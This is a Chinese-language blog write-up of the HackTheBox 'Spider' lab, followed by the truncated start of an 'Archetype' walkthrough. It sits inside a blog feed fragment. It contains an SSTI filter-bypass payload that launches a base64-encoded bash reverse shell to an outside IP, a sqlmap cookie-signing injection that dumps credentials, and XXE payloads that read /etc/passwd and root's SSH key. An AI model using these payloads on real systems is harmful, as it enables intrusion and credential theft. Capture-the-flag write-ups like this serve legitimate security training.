    <url>/2021/12/07/HTB/Spider/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-端口探测"><a href="#0x01-端口探测" class="headerlink" title="0x01 端口探测"></a>0x01 端口探测</h1><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -v <span class="hljs-number">10.10.10.243</span><br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">2048</span> <span class="hljs-number">28</span>:f1:<span class="hljs-number">61</span>:<span class="hljs-number">28</span>:<span class="hljs-number">01</span>:<span class="hljs-number">63</span>:<span class="hljs-number">29</span>:<span class="hljs-number">6</span>d:c5:<span class="hljs-number">03</span>:<span class="hljs-number">6</span>d:a9:f0:b0:<span class="hljs-number">66</span>:<span class="hljs-number">61</span> (RSA)<br>|   <span class="hljs-type">256</span> <span class="hljs-number">3</span>a:<span class="hljs-number">15</span>:<span class="hljs-number">8</span>c:cc:<span class="hljs-number">66</span>:f4:<span class="hljs-number">9</span>d:cb:ed:<span class="hljs-number">8</span>a:<span class="hljs-number">1</span>f:f9:d7:ab:d1:cc (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> a6:d4:<span class="hljs-number">0</span>c:<span class="hljs-number">8</span>e:<span class="hljs-number">5</span>b:aa:<span class="hljs-number">3</span>f:<span class="hljs-number">93</span>:<span class="hljs-number">74</span>:d6:a8:<span class="hljs-number">08</span>:c9:<span class="hljs-number">52</span>:<span class="hljs-number">39</span>:<span class="hljs-number">09</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1.14</span><span class="hljs-number">.0</span> (Ubuntu)<br>| <span class="hljs-type">http</span>-methods: <br>|<span class="hljs-type">_</span>  Supported Methods: GET HEAD POST OPTIONS<br>|<span class="hljs-type">_http</span>-server-header: nginx/<span class="hljs-number">1.14</span><span class="hljs-number">.0</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: Did not follow redirect to http://spider.htb/<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><h1 id="0x02-WebShell-x2F-User-Shell"><a href="#0x02-WebShell-x2F-User-Shell" class="headerlink" title="0x02 WebShell&#x2F;User Shell"></a>0x02 WebShell&#x2F;User Shell</h1><p>访问80端口，直接跳转到spider.htb，然后报错：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023123446608.png" alt="image-20211023123446608"></p><p>在&#x2F;etc&#x2F;hosts将域名和端口进行绑定</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023123627556.png" alt="image-20211023123627556"></p><p>重新访问spider.htb，界面正常。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023123540245.png" alt="image-20211023123540245"></p><p>抓包能够发现携带了cookie，根据cookie形式推测后端使用了flask：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023124830611.png" alt="image-20211023124830611"></p><p>在用户注册界面尝试SSTI，用户名输入4：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023125010739.png" alt="image-20211023125010739"></p><p>然后进入登录后界面的USER INFORMATION界面：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023125145997.png" alt="image-20211023125145997"></p><p>发现成功解析：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023125153697.png" alt="image-20211023125153697"></p><p>试着读一下config：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023132136519.png" alt="image-20211023132136519"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023132405045.png" alt="image-20211023132405045"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&lt;Config &#123;<span class="hljs-string">&#x27;ENV&#x27;</span>: <span class="hljs-string">&#x27;production&#x27;</span>, <span class="hljs-string">&#x27;DEBUG&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;TESTING&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#x27;</span>, <span class="hljs-string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(<span class="hljs-number">31</span>), <span class="hljs-string">&#x27;USE_X_SENDFILE&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="hljs-string">&#x27;session&#x27;</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: datetime.timedelta(<span class="hljs-number">0</span>, <span class="hljs-number">43200</span>), <span class="hljs-string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;JSON_AS_ASCII&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;JSON_SORT_KEYS&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>, <span class="hljs-string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: <span class="hljs-built_in">None</span>, <span class="hljs-string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: <span class="hljs-number">4093</span>, <span class="hljs-string">&#x27;RATELIMIT_ENABLED&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;RATELIMIT_DEFAULTS_PER_METHOD&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;RATELIMIT_SWALLOW_ERRORS&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADERS_ENABLED&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;RATELIMIT_STORAGE_URL&#x27;</span>: <span class="hljs-string">&#x27;memory://&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_STRATEGY&#x27;</span>: <span class="hljs-string">&#x27;fixed-window&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADER_RESET&#x27;</span>: <span class="hljs-string">&#x27;X-RateLimit-Reset&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADER_REMAINING&#x27;</span>: <span class="hljs-string">&#x27;X-RateLimit-Remaining&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADER_LIMIT&#x27;</span>: <span class="hljs-string">&#x27;X-RateLimit-Limit&#x27;</span>, <span class="hljs-string">&#x27;RATELIMIT_HEADER_RETRY_AFTER&#x27;</span>: <span class="hljs-string">&#x27;Retry-After&#x27;</span>, <span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>: <span class="hljs-string">&#x27;static/uploads&#x27;</span>&#125;&gt;<br></code></pre></td></tr></table></figure><p>使用<code>flask-session-cookie-manager</code>对cookie进行解密，发现以uuid形式存储。即在这条路我们需要拿到管理员的uuid。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">E:\flask-session-cookie-manager-master&gt;python flask_session_cookie_manager3<span class="hljs-selector-class">.py</span> decode -s Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942 -c eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IjM3MTFkYzU0LThhZDEtNDNjOC05YjBlLTU5YjIzNzU5ZmU0MiJ9<span class="hljs-selector-class">.YXORyQ</span>.<span class="hljs-number">5</span>Gl9TfDi1A0VQnsvjoEbBdJFLxU<br><br>&#123;<span class="hljs-string">&#x27;cart_items&#x27;</span>: <span class="hljs-selector-attr">[]</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>: <span class="hljs-string">&#x27;3711dc54-8ad1-43c8-9b0e-59b23759fe42&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>换一条路试试命令执行，发现被限制了字符数，不太可能绕过：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023132211989.png" alt="image-20211023132211989"></p><p>继续探索，最后在hacktricks上找到了一个关于flask的session注入的问题：</p><p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval">https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#eval</a></p><blockquote><p><strong>Sqlmap</strong> allows the use of <code>-e</code> or <code>--eval</code> to process each payload before sending it with some python oneliner. This makes very easy and fast to process in custom ways the payload before sending it. In the following example the <strong>flask cookie session</strong> <strong>is signed by flask with the known secret before sending it</strong>:</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap http:<span class="hljs-string">//1.1.1.1/sqli</span> <span class="hljs-params">--eval</span> <span class="hljs-string">&quot;from flask_unsign import session as s; session = s.sign(&#123;&#x27;uid&#x27;: session&#125;, secret=&#x27;SecretExfilratedFromTheMachine&#x27;)&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;session=*&quot;</span> <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure><p>这里一开始没弄出来，最后发现是VPN的问题。换了个VPN后能跑出数据：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sqlmap http://spider.htb/ --eval &quot;from flask_unsign import session as s; session = s.sign(&#123;&#x27;uuid&#x27;: session&#125;, secret=&#x27;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#x27;)&quot; --cookie=&quot;session=*&quot; --dump<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023195948896.png" alt="image-20211023195948896"></p><p> dump后的数据如下，第一条即为管理员的信息：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023200030569.png" alt="image-20211023200030569"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">129f60ea</span>-<span class="hljs-number">30</span>cf-<span class="hljs-number">4065</span>-afb9-<span class="hljs-number">6</span>be45ad38b73<br><span class="hljs-attribute">chiv</span><br><span class="hljs-attribute">ch1VW4sHERE7331</span><br></code></pre></td></tr></table></figure><p>以管理员身份登录，发现直接进入了admin panel：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023200249460.png" alt="image-20211023200249460"></p><p>然年后有一个supportportal的url：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023200316675.png" alt="image-20211023200316675"></p><p><a href="http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal">http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</a></p><p>界面如下，不出意外的话又是一个SSTI：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023200704317.png" alt="image-20211023200704317"></p><p>然后发现有WAF：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023202237405.png" alt="image-20211023202237405"></p><p>最后构造出Payload的过程如下：</p><p>首先去<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass">PayloadAllTheThings</a>上找了个Payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&#x27;application&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fbuiltins\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fimport\x5f\x5f&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;id&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>输入发现过滤了单引号<code>&#39;</code>，将单引号替换成双引号</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&quot;application&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-name">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>)|attr(<span class="hljs-name">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-name">&quot;\x5f\x5fimport\x5f\x5f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;id&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>然后是发现<code>&#123;&#123;&#125;&#125;</code>被过滤，使用<code>&#123;%include ...%&#125;</code>的方式进行绕过：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% include request|attr(<span class="hljs-string">&quot;application&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fimport\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;id&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)() %&#125;<br></code></pre></td></tr></table></figure><p>成功执行后服务器会报500的错误，没有回显。通过sleep函数判断是否能够执行命令，发现可以：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024123656754-16350657290622.png" alt="image-20211024123656754"></p><p>接着构造反弹shell的payload，使用base64编码：</p><p>这里不知道为什么直接的<code>bash -i &gt;&amp; /dev/tcp/10.10.16.33/4455 0&gt;&amp;1</code>不能起作用，知道的师傅可以教教</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">bash -c <span class="hljs-string">&#x27;exec bash -i &gt;&amp; /dev/tcp/10.10.16.33/4455 0&gt;&amp;1&#x27;</span> <span class="hljs-attr">#原payload</span><br><span class="hljs-attr">YmFzaCAtYyAnZXhlYyBiYXNoIC1</span>pID<span class="hljs-number">4</span>mIC<span class="hljs-number">9</span>kZXYvdG<span class="hljs-symbol">NwLzEwLjEwLjE2</span>LjMzLzQ<span class="hljs-number">0</span><span class="hljs-symbol">NTUgMD4</span>mMSc= <span class="hljs-attr">#Base64</span>编码<br></code></pre></td></tr></table></figure><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% include request|attr(<span class="hljs-string">&quot;application&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>)|attr(<span class="hljs-string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;\x5f\x5fimport\x5f\x5f&quot;</span>)(<span class="hljs-string">&quot;os&quot;</span>)|attr(<span class="hljs-string">&quot;popen&quot;</span>)(<span class="hljs-string">&quot;echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjMzLzQ0NTUgMD4mMSc= | base64 -d | bash&quot;</span>)|attr(<span class="hljs-string">&quot;read&quot;</span>)() %&#125;<br></code></pre></td></tr></table></figure><p>拿到普通用户的shell：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023212859982.png" alt="image-20211023212859982"></p><p>直接去家目录下的.ssh目录翻私钥，然后连接之：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211023213515953.png" alt="image-20211023213515953"></p><h1 id="0x03-Root-Shell"><a href="#0x03-Root-Shell" class="headerlink" title="0x03 Root Shell"></a>0x03 Root Shell</h1><p>拿到User Shell后尝试提权，在查看网络连接的时候发现有8080端口。使用curl测试发现是不同的app：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024170953998.png" alt="image-20211024170953998"></p><p>于是使用ssh进行本地转发：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8888</span>:localhost:<span class="hljs-number">8080</span> chiv@<span class="hljs-number">10.10.10.243</span> -i chiv<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024171133075.png" alt="image-20211024171133075"></p><p>这里以任意用户都能登录，登录后会分配又一个flask的cookie：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">.eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb<span class="hljs-string">-8770</span>rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m<span class="hljs-string">-8</span>_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8.YXQcMA._xj9xfPtBO9gayEARbgbcNUl<span class="hljs-string">-48</span><br></code></pre></td></tr></table></figure><p>解密如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">┌──(kali㉿kali)-<span class="hljs-selector-attr">[~/桌面]</span><br>└─$ flask-unsign <span class="hljs-attr">--decode</span> <span class="hljs-attr">--cookie</span> <span class="hljs-selector-class">.eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb-8770rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m-8_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8</span><span class="hljs-selector-class">.YXQcMA</span>._xj9xfPtBO9gayEARbgbcNUl-<span class="hljs-number">48</span><br><br>&#123;<span class="hljs-string">&#x27;lxml&#x27;</span>: b<span class="hljs-string">&#x27;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+YWRtaW48L3VzZXJuYW1lPgogICAgICAgIDxpc19hZG1pbj4wPC9pc19hZG1pbj4KICAgIDwvZGF0YT4KPC9yb290Pg==&#x27;</span>, <span class="hljs-string">&#x27;points&#x27;</span>: <span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><p>Base64内容解码，发现有xml，推测存在xxe：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- API Version 1.0.0 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">is_admin</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">is_admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>开始查找利用点，抓包发现登录时有个version参数，这个会影响到后面cookie的生成：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024103027313.png" alt="image-20211024103027313"></p><p>于是乎这里就很明显了，我们可以通过闭合注释注入xml代码，造成xxe。</p><p>这里还有一点，就是username参数也在xml的便签中，我们便可以将输入<code>&amp;admin;</code>，将一个admin实体注入进去。</p><p>构造payload如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=%26admin%3b&amp;version=1.0.0 --&gt;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span><span class="hljs-comment">&lt;!--</span><br></code></pre></td></tr></table></figure><p>使用生成的cookie访问site，能够发现回显：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024111438234.png" alt="image-20211024111438234"></p><p>这样的利用方式就比较简单了，我们直接读取root用户的私钥即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=%26admin%3b&amp;version=1.0.0 --&gt;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;file:///root/.ssh/id_rsa&#x27;</span>&gt;</span>]&gt;</span><span class="hljs-comment">&lt;!--</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024111818598.png" alt="image-20211024111818598"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024111806257.png" alt="image-20211024111806257"></p><p>保存后ssh登录即可：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/10/img/Spider.assets/image-20211024125240826.png" alt="image-20211024125240826"></p><h1 id="0x03-Summary"><a href="#0x03-Summary" class="headerlink" title="0x03 Summary"></a>0x03 Summary</h1><p>这是一个Medium难度的Linux靶机，主要考察内容如下：</p><ul><li>SSTI</li><li>Flask Session注入</li><li>WAF绕过</li><li>XXE</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - StartingPoint-Archetype</title>
    <link href="/2021/12/07/HTB/StartingPoint-Archetype/"/>
    <url>/2021/12/07/HTB/StartingPoint-Archetype/</url>
    
    <content type="html"><![CDATA[<p>吐槽下VPN，太不稳定了。。</p><p>但没交钱嘛，俺无话可说</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -v <span class="hljs-number">10.10.10.27</span><br></code></pre></td></tr></table></figure><p>-sC：使用默认脚本进行扫描，等同于–script&#x3D;default<br>-sV：探测开启的端口来获取服务、版本信息</p><p>-v：vpn不稳定，开了看扫描是不是挂掉了</p><p>典型的windows配置，没有WEB站点：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102057170.png" alt="image-20210912102057170"></p><h2 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h2><p>445端口的话可以尝试SMB爆破、匿名访问等，winserver版本那么高就不可能有永恒之蓝啦。</p><p>这里最后试出来是匿名访问，使用如下命令访问共享资源列表：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient -N -L <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.27</span>/<br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102317995.png" alt="image-20210912102317995"></p><p>将<code>-N</code>参数去掉即可访问对应的共享资源，然后使用dir命令即可看到共享的文件。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2021/09/HackTheBox/img/StartingPoint-Archetype.assets/image-20210912102501965.png" alt="image-20210912102501965"></p><p>这里是有一个<code>prod.dtsConfig</code>，使用<code>get</code>命令可以下载下来：</p><p><img 